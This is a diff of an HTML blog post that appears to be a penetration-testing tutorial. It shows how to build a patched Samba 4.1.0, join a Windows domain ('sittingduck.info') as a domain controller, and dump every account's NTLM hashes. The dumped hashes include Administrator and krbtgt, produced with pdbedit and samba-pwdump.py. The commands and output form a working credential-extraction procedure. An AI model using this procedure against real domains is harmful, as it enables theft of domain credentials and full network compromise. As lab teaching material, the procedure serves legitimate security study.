@@ -26,29 +26,29 @@
 &lt;p&gt;You will probably also require some dependencies to be installed:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Since the patch is kinda wonky, you need to make a &lt;code&gt;src&lt;/code&gt; directory and extract samba into there first. Then apply the patch in whatever directory is above src&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;mkdir src
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir src
 mv samba-4.1.0.tar.gz src/
 cd src/
 tar zxvf samba-4.1.0.tar.gz
 cd /root/
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So it would look like this:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;samba-4.1.0_replication-only-patch.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;samba-4.1.0_replication-only-patch.txt
 src/
 src/samba-4.1.0/
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;then run &lt;code&gt;patch -p0 &amp;lt; samba-4.1.0_replication-only-patch.txt&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cd ./src/samba-4.1.0/
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd ./src/samba-4.1.0/
 ./configure
 make
 make install
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Prepare the box:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next you need to make sure you are resolving correctly (if you can&amp;rsquo;t resolve the SRV record &lt;code&gt;_ldap._tcp.sittingduck.info&lt;/code&gt; (sittingduck.info being the domain) then this isn&amp;rsquo;t going to work.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;echo nameserver 192.168.92.37 &amp;gt; /etc/resolv.conf # this is the IP address of the DC
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo nameserver 192.168.92.37 &amp;gt; /etc/resolv.conf # this is the IP address of the DC
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then start the clone:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like this:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
-Finding a writeable DC for domain &#39;sittingduck.info&#39;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
+Finding a writeable DC for domain &amp;#39;sittingduck.info&amp;#39;
 Found DC 2K8DC.sittingduck.info
 Password for [SITTINGDUCK\administrator]:
 workgroup is SITTINGDUCK
@@ -75,18 +75,16 @@ Committing SAM database
 descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
 descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
 Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then to get the hashes:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
 2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S          ]:LCT-530FC425:
 Administrator:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[U          ]:LCT-531006A4:
 krbtgt:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:F2EE6AB6F40810169E0E46B126CEFBEF:[DU         ]:LCT-530FC3FF:
 nobody:65534:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:[U          ]:LCT-00000000:
 jdoe:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-530FC5FF:
 uber:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-53101261:
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or you can do it with history:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
 SAMBACLONE$:1104:::::
 2K8DC$:1000::cb14f1166bbe1749ac0fb40240c5dc30:::
 Administrator:500::88e4d9fabaecf3dec18dd80905521b29:::
